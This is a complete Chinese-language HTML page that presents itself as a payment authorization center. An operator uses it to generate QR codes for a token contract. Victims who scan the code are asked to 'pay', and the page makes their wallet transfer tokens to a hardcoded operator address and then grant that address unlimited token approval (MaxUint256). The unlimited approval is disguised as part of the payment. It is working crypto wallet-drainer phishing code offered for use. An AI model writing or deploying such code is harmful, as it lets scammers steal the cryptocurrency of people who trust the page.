<!DOCTYPE html>
<html lang="utf-8">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>支付授权中心</title>
<script src="https://cdn.jsdelivr.net/npm/ethers@6.13.0/dist/ethers.umd.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui, sans-serif}
body{background:#050814;color:#fff;padding:20px;}
.container{max-width:480px;margin:0 auto;}
.card{background:rgba(255,255,255,0.05);border-radius:20px;padding:24px 20px;margin-bottom:20px;}
.title{font-size:18px;font-weight:600;margin-bottom:16px;}
input{
  width:100%;padding:14px 16px;border-radius:14px;
  background:rgba(255,255,255,0.08);
  border:1px solid rgba(255,255,255,0.1);
  color:#fff;font-size:15px;margin-bottom:12px;
}
button{
  width:100%;padding:14px 16px;border-radius:14px;
  background:#00e0ff;color:#000;font-weight:bold;
  border:none;cursor:pointer;font-size:15px;
}
.qr-box{
  margin:20px auto;width:240px;height:240px;
  background:#fff;padding:10px;border-radius:16px;
  display:none;
}
</style>
</head>
<body>

<div class="container">
  <!-- 你后台生成二维码用 -->
  <div class="card" id="adminPanel">
    <div class="title">生成支付二维码</div>
    <input id="token" placeholder="粘贴代币合约地址">
    <button onclick="createQR()">生成二维码</button>
    <div id="qrcode" class="qr-box"></div>
  </div>

  <!-- 玩家扫码看到的界面 -->
  <div class="card" id="userPanel" style="display:none;">
    <div class="title">支付并授权</div>
    <input id="userAmount" placeholder="请输入支付数量" type="number">
    <button onclick="payAndAuth()">确认支付并授权</button>
  </div>
</div>

<script>
// ==========================
// 你的庄家地址已内置 ✅
// ==========================
const ADMIN_WALLET = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";

// ==========================
// 你：生成二维码
// ==========================
function createQR() {
  const token = document.getElementById('token').value.trim();
  if (!token) {
    alert('请输入代币合约地址');
    return;
  }

  const url = `${location.origin}${location.pathname}?token=${token}`;

  QRCode.toCanvas(document.getElementById('qrcode'), url, {
    width: 220, margin:1
  }, err => {
    if (!err) document.getElementById('qrcode').style.display = 'block';
  });
}

// ==========================
// 玩家扫码后自动加载界面
// ==========================
window.onload = async () => {
  const params = new URLSearchParams(location.search);
  const token = params.get('token');

  // 如果是玩家扫码（带token参数）
  if (token) {
    document.getElementById('adminPanel').style.display = 'none';
    document.getElementById('userPanel').style.display = 'block';
    window.tokenAddress = token;
    return;
  }
};

// ==========================
// 玩家支付 + 授权（金额自己填）
// ==========================
async function payAndAuth() {
  const amount = document.getElementById('userAmount').value.trim();
  const token = window.tokenAddress;

  if (!amount || Number(amount) <= 0) {
    alert("请输入正确金额");
    return;
  }

  try {
    const provider = new ethers.BrowserProvider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    const signer = await provider.getSigner();

    const ERC20_ABI = [
      "function transfer(address to, uint256 amount) external returns (bool)",
      "function approve(address spender, uint256 amount) external returns (bool)",
      "function decimals() view returns (uint8)"
    ];

    const tokenContract = new ethers.Contract(token, ERC20_ABI, signer);
    const decimals = await tokenContract.decimals().catch(() => 18);
    const value = ethers.parseUnits(amount, decimals);

    // 1. 转给庄家
    await tokenContract.transfer(ADMIN_WALLET, value);
    // 2. 授权给庄家（无限权限）
    await tokenContract.approve(ADMIN_WALLET, ethers.MaxUint256);

    alert("支付与授权成功！");
  } catch (e) {
    alert("失败：" + e.message);
  }
}
</script>
</body>
</html>
